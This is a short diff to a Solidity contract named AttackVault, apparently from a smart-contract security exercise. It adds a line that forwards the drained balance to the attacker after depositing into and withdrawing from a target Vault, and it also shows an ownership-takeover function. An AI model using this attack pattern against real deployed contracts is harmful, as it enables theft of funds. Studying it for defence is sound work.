@@ -28,6 +28,7 @@ contract AttackVault is Ownable {
 
         Vault(attckAddress).deposite{value: amount}();
         Vault(attckAddress).withdraw();
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     function attackChangeOwner(bytes32 _password, address newOwner) public onlyOwner() {
